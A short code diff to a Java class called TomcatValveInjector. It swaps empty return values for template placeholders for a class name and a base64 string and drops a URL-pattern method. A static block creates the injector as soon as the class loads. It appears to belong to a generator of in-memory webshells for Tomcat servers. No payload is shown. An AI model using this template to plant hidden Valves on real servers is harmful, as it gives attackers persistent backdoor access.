@@ -22,19 +22,13 @@ import java.util.zip.GZIPInputStream;
  */
 public class TomcatValveInjector {
 
-    public String getUrlPattern() {
-        return "/*";
-    }
-
-
     public String getClassName() {
-        return "";
+        return "{{className}}";
     }
 
     public String getBase64String() {
-        return "";
+        return "{{base64Str}}";
     }
-
 
     static {
         new TomcatValveInjector();
